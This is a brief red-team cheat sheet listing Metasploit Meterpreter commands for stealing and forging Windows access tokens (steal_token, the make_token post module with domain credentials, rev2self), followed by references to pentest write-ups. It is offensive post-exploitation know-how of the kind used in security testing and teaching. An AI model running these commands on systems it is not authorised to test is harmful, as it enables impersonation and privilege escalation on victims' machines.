# Metasploit

Steal Token

```
meterpreter > steal_token <pid>

meterpreter > getuid

meterpreter > getpid

meterpreter > drop_token
```

Make Token

```
meterpreter > run post/windows/manage/make_token domain=<domain_name> username=<username> password=<password>

meterpreter > getuid

meterpreter > getprivs

meterpreter > rev2self
```

---
## References

- [Rapid7: Metasploit Framework Make Token Manage Post Module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/manage/make_token.md)

- [Pentestlab Blog: Token Stealing and Incognito](https://pentestlab.blog/2012/08/07/token-stealing-and-incognito/)

- [Demystifying Cobalt Strike’s “make_token” Command](https://research.nccgroup.com/2023/11/10/demystifying-cobalt-strikes-make_token-command/)

- [DMCXBlue Gitbook: Privilege Escalation Access Token Manipulation](https://dmcxblue.gitbook.io/red-team-notes/privesc/access-token-manipulation)

- [Exploit DB: Abusing Token Privileges For Local Privilege Escalation](https://www.exploit-db.com/papers/42556)